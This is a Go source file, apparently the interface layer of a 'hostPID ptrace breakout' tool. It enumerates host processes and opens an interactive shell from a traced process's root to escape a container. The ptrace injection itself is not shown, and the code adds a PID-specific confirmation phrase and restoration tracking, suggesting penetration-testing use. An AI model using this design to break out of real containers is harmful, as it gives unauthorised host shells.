// Package hostpidptrace opens an interactive shell from a disposable child of
// an explicitly selected process at visible PID 1's namespace boundary.
package hostpidptrace

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
)

const (
	// WorkerArgument selects the private ptrace worker. Target and terminal
	// metadata are transferred through anonymous pipes, never argv or env.
	WorkerArgument = "--internal-hostpid-ptrace-worker"

	maxProtocolBytes = 1024 * 1024
)

var ErrUnsupported = errors.New("hostPID ptrace breakout is supported only on Linux AMD64")

// Identity is a stable device/inode identity for a namespace or root handle.
type Identity struct {
	Device uint64 `json:"device"`
	Inode  uint64 `json:"inode"`
}

// Candidate contains the evidence used to qualify a disposable trace target.
// CommandLine is sanitized and bounded for display; it is never used to find
// or reopen the process.
type Candidate struct {
	PID               int                 `json:"pid"`
	StartTime         uint64              `json:"start_time"`
	Comm              string              `json:"comm"`
	Executable        string              `json:"executable"`
	CommandLine       string              `json:"command_line"`
	CommandLineDigest string              `json:"command_line_digest"`
	State             byte                `json:"state"`
	UIDs              [4]uint32           `json:"uids"`
	Threads           int                 `json:"threads"`
	TracerPID         int                 `json:"tracer_pid"`
	CoreDumping       int                 `json:"core_dumping"`
	NamespaceIDs      map[string]Identity `json:"namespace_ids"`
	RootID            Identity            `json:"root_id"`
	PIDDepth          int                 `json:"pid_depth"`
}

// ProbeResult describes the read-only eligibility check and candidate list.
type ProbeResult struct {
	Candidates    []Candidate
	YamaScope     *int
	SeccompMode   int
	SecurityLabel string
	Warnings      []string
}

type terminalSpec struct {
	Number   int      `json:"number"`
	Identity Identity `json:"identity"`
	DeviceID uint64   `json:"device_id"`
}

// RunOptions configures one interactive worker invocation.
type RunOptions struct {
	Target   Candidate
	Terminal terminalSpec
}

// Result separates the interactive shell result from cleanup/restoration evidence.
type Result struct {
	ShellExited    bool   `json:"shell_exited"`
	ExitCode       int    `json:"exit_code"`
	Signal         int    `json:"signal"`
	TargetRestored bool   `json:"target_restored"`
	TargetDetached bool   `json:"target_detached"`
	Stage          string `json:"stage"`
}

// ConfirmationPhrase is deliberately PID-specific and exact.
func ConfirmationPhrase(pid int) string {
	return fmt.Sprintf("TRACE-DISPOSABLE-HOST-PROCESS-%d", pid)
}

func normalizeRunOptions(options RunOptions) (RunOptions, error) {
	if options.Target.PID <= 1 {
		return options, errors.New("a disposable target PID greater than 1 is required")
	}
	if options.Terminal.Number < 0 || options.Terminal.Number > 1_000_000 {
		return options, errors.New("host terminal number is invalid")
	}
	if options.Terminal.Identity == (Identity{}) || options.Terminal.DeviceID == 0 {
		return options, errors.New("host terminal identity is invalid")
	}
	return options, nil
}

// Probe performs read-only preflight and candidate enumeration.
func Probe(ctx context.Context) (ProbeResult, error) { return probePlatform(ctx) }

// Launch opens a PTY from the selected target's root and relays one interactive
// shell through a private re-exec worker. terminalFD is -1 for non-terminal
// input and otherwise names the local terminal used for resize propagation.
func Launch(ctx context.Context, target Candidate, input io.Reader, output io.Writer, terminalFD int) (Result, error) {
	if target.PID <= 1 {
		return Result{}, errors.New("a disposable target PID greater than 1 is required")
	}
	return launchInteractive(ctx, target, input, output, terminalFD)
}

// RunWorker handles the private worker mode using inherited request and result
// pipes. It returns the process exit status; diagnostics contain no shell input.
func RunWorker(args []string, request, response io.ReadWriter, stderr io.Writer) int {
	if len(args) != 0 {
		fmt.Fprintln(stderr, "[hostpid-ptrace-breakout] internal worker does not accept arguments")
		return 2
	}
	if err := runWorker(request, response); err != nil {
		fmt.Fprintf(stderr, "[hostpid-ptrace-breakout] private worker failed: %v\n", err)
		return 1
	}
	return 0
}

// RunInheritedWorker opens the two anonymous pipes installed as file
// descriptors 3 and 4 by Launch and dispatches the private worker.
func RunInheritedWorker(args []string, stderr io.Writer) int {
	request := os.NewFile(3, "hostpid-ptrace-request")
	response := os.NewFile(4, "hostpid-ptrace-response")
	if request == nil || response == nil {
		fmt.Fprintln(stderr, "[hostpid-ptrace-breakout] inherited worker pipes are unavailable")
		return 1
	}
	defer request.Close()
	defer response.Close()
	return RunWorker(args, request, response, stderr)
}
